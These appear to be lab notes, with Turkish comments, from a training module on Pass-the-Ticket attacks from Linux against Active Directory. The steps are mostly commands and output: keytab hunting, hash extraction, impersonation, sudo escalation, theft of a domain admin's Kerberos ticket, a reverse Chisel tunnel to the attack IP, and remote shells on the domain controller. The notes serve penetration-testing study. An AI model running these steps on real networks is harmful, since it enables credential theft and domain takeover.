# Pass-the-Ticket from Linux

## Scenario

| ATTACK MACHINE | MS01 | LINUX01 | DC01 |
|---|---|---|---|
| 10.10.15.138 | 172.16.1.5:2222 | 172.16.1.15:22 | 172.16.1.10 |

* LINUX01 bilgisayarı ve DC01 bilgisayarı arasında bir bağlantı vardır.
* LINUX01 bilgisayarı sadece MS01 bilgisayarı aracılığı ile erişilebilir durumdadır.

## Linux Auth via Port Forward

```sh
my@attack:~$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```

## Linux AD Integration

### Realm

```sh
david@inlanefreight.htb@linux01:~$ realm list
```

```output title="Output" hl_lines="5 16-17"
inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

### Ps

```sh
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i 'winbind\|sssd'
```

```output title="Output"
root         780       1  0 10:46 ?        00:00:00 /usr/sbin/sssd -i --logger=files
root        1063     780  0 10:46 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        1071     780  0 10:46 ?        00:00:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        1072     780  0 10:46 ?        00:00:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
root        1326       1  0 10:50 ?        00:00:00 /usr/libexec/sssd/sssd_pac --logger=files --socket-activated
david@i+    2153    1915  0 11:00 pts/0    00:00:00 grep --color=auto -i winbind\|sssd
```

## [Keytab](https://web.mit.edu/kerberos/krb5-devel/doc/basic/keytab_def.html) Files

!!! abstract

    Keytab (key table) dosyası bir veya daha fazla sorumlu için uzun vadeli anahtarları içerir.

### Searching Keytab Files

#### Find

```sh
david@inlanefreight.htb@linux01:~$ find / \( -name "*keytab*" -o -name "*.kt" \) -ls 2> /dev/null
```

```output title="Output" hl_lines="5 7"
287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
131610      4 -rw-------   1 root     root         2694 Dec 12 10:47 /etc/krb5.keytab
262464     12 -rw-r--r--   1 root     root        10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
262618      4 -rw-rw-rw-   1 root     root          216 Dec 12 11:00 /opt/specialfiles/carlos.keytab
131201      8 -rw-r--r--   1 root     root         4582 Oct  6  2022 /opt/keytabextract.py
287958      4 drwx------   2 sssd     sssd         4096 Jun 21  2022 /var/lib/sss/keytabs
398204      4 -rw-r--r--   1 root     root          380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
```

#### Cron Jobs

```sh
david@inlanefreight.htb@linux01:~$ crontab -l
```

```output title="Output"
no crontab for david@inlanefreight.htb
```

### File Information

```sh
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab
```

```output title="Output"
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 12/12/2024 17:40:01 carlos@INLANEFREIGHT.HTB
```

### Abusing Keytab Files

#### Impersonating Carlos

```sh
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```

#### Connecting Share as Carlos

```sh
david@inlanefreight.htb@linux01:~$ smbclient //DC01/carlos -k -no-pass --command ls
```

#### [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)

!!! tip

    Hash kırmak için [Free Password Hash Cracker](https://crackstation.net/) sitesi kullanılabilir.

```sh
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

```output title="Output" hl_lines="6 7"
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
    REALM : INLANEFREIGHT.HTB
    SERVICE PRINCIPAL : carlos/
    NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
    AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
    AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

#### Switching to Carlos

```sh
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb
```

### Searching Keytab Files as Carlos

#### Using Find

```sh
carlos@inlanefreight.htb@linux01:~$ find / \( -name "*keytab*" -o -name "*.kt" \) -ls 2> /dev/null
```

```output title="Output" hl_lines="5-7"
287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
288276      4 -rw-r--r--   1 root     root         1871 Oct  4  2022 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
287720     24 -rw-r--r--   1 root     root        22768 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
286812     28 -rw-r--r--   1 root     root        26856 Jul 18  2022 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
288491      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb      146 Oct  6  2022 /home/carlos@inlanefreight.htb/.scripts/john.keytab
262618      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb      246 May 10 04:00 /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
262184      4 -rw-------   1 carlos@inlanefreight.htb domain users@inlanefreight.htb       94 May 10 04:00 /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
131610      4 -rw-------   1 root                     root                               2694 May 10 03:07 /etc/krb5.keytab
262464     12 -rw-r--r--   1 root                     root                              10015 Oct  4  2022 /opt/impacket/impacket/krb5/keytab.py
262607      4 -rw-rw-rw-   1 root                     root                                216 May 10 04:00 /opt/specialfiles/carlos.keytab
131201      8 -rw-r--r--   1 root                     root                               4582 Oct  6  2022 /opt/keytabextract.py
287958      4 drwx------   2 sssd                     sssd                               4096 Jun 21  2022 /var/lib/sss/keytabs
398204      4 -rw-r--r--   1 root                     root                                380 Oct  4  2022 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
```

#### Using Cron Jobs

```sh
carlos@inlanefreight.htb@linux01:~$ crontab -l
```

```output title="Output" hl_lines="24"
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
*/5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
```

## [CCACHE](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) Files

!!! abstract

    CCACHE (credential cache) dosyası Kerberos kimlik bilgilerini geçerli oldukları sürece tutar. Çoğu durumda bir bilet içerir.

### Listing Allowed Commands

```sh
svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
```

```output title="Output" hl_lines="5"
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
```

### Privilege Escalation

```sh
svc_workstations@inlanefreight.htb@linux01:~$ sudo su -
```

### Searching CCACHE Files

#### Environment Variable

```sh
root@linux01:~# env | grep -i KRB5
```

```output title="Output"
KRB5CCNAME=FILE:/tmp/krb5cc_647401109_hZhKBv
```

#### Temp Directory

```sh
root@linux01:~# ls -l /tmp/krb5*
```

```output title="Output" hl_lines="2"
-rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Dec 12 12:55 krb5cc_647401106_HRJDux
-rw------- 1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1414 Dec 12 12:55 krb5cc_647401106_WDgqBz
-rw------- 1 david@inlanefreight.htb            domain users@inlanefreight.htb 2935 Dec 12 11:41 krb5cc_647401107_hW4Tx6
-rw------- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Dec 12 12:45 krb5cc_647401109_hZhKBv
-rw------- 1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Dec 12 12:57 krb5cc_647402606
-rw------- 1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1746 Dec 12 12:23 krb5cc_647402606_91JyEJ
```

### Abusing CCACHE Files

!!! warning

    * Dosya üzerinde okuma iznine ihtiyaç duyulur.
    * Dosyayı sadece dosyayı oluşturan kullanıcı ve root kullanıcısı okuyabilir.

#### Identifying Group Membership

```sh
root@linux01:~# id julio@inlanefreight.htb
```

```output title="Output"
uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

#### Impersonating Julio

```sh
root@linux01:~# cp /tmp/krb5cc_647401106_WDgqBz /home/david@inlanefreight.htb
root@linux01:~# export KRB5CCNAME='/home/david@inlanefreight.htb/krb5cc_647401106_WDgqBz'
```

#### Connecting Share as Julio

!!! success

    Julio kullanıcısı Domain Admins grubunun bir üyesidir ve DC01 ile bağlantı kurabilir.

```sh
root@linux01:~# smbclient //DC01/julio -k -no-pass --command ls
```

## Using Linux Attack Tools

### Proxychains Configuration File

```sh
my@attack:~$ tail /etc/proxychains.conf
```

```ini title="Output" hl_lines="9"
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 9050
```

### Chisel Setup

#### Server on Attack Machine

```sh
my@attack:~/chisel$ ./chisel server -v -p 1234 --socks5 --reverse
```

```output title="Output"
2024/12/12 18:20:18 server: Reverse tunnelling enabled
2024/12/12 18:20:18 server: Fingerprint G30BOgM+Z2JlBZC9VW4I4y2HksOyYQDXrzNoMtI1P9w=
2024/12/12 18:20:18 server: Listening on http://0.0.0.0:1234
```

#### Pivot RDP Connection

```sh
my@attack:~$ xfreerdp /v:10.129.204.23 /u:'david' /p:'Password2' /d:INLANEFREIGHT.HTB /drive:linux,/tmp
```

#### Client on Pivot

```pwsh
PS C:\Users\david> C:\Tools\chisel.exe -v 10.10.15.138:1234 R:9050:socks
```

```output title="Output" hl_lines="1"
2024/12/12 09:24:53 client: Connecting to ws://10.10.15.138:1234
2024/12/12 09:24:55 client: Handshaking...
2024/12/12 09:24:57 client: Sending config
2024/12/12 09:24:57 client: Connected (Latency 210.3788ms)
2024/12/12 09:24:57 client: tun: SSH connected
```

### Transferring CCACHE File

#### Making File Readable

```sh
root@linux01:~# chmod +r /home/david@inlanefreight.htb/krb5cc_647401106_WDgqBz
```

#### Downloading

```sh
my@attack:~$ scp -P 2222 david@INLANEFREIGHT.HTB@10.129.204.23:/home/david@inlanefreight.htb/krb5cc_647401106_WDgqBz /tmp
```

#### Setting KRB5CCNAME

```sh
my@attack:~$ export KRB5CCNAME='/tmp/krb5cc_647401106_WDgqBz'
```

### Impacket

!!! warning

    Hedef bilgisayarın adı verilmelidir.

```sh
my@attack:~$ proxychains -q wmiexec.py DC01 -k -no-pass
```

### Evil-WinRM

#### Kerberos Package

```sh
my@attack:~$ sudo apt install -y krb5-user
```

#### Kerberos Configuration File

```sh
my@attack:~$ head /etc/krb5.conf
```

```output title="Output" hl_lines="2 6"
[libdefaults]
        default_realm = INLANEFREIGHT.HTB

[realms]
        INLANEFREIGHT.HTB = {
            kdc = DC01.INLANEFREIGHT.HTB
        }
```

#### Kerberos Connection

```sh
my@attack:~$ proxychains -q evil-winrm -i DC01 -r INLANEFREIGHT.HTB
```

## Miscellaneous

### [Linikatz](https://github.com/CiscoCXSecurity/linikatz)

```sh
root@linux01:~# /opt/linikatz.sh
```

### Rubeus

#### CCACHE File to Kirbi

```sh
my@attack:~$ ticketConverter.py /tmp/krb5cc_647401106_WDgqBz /tmp/julio.kirbi
```

#### Ticket Import

```pwsh
PS C:\Users\david> C:\Tools\Rubeus.exe ptt /ticket:\\tsclient\linux\julio.kirbi
```
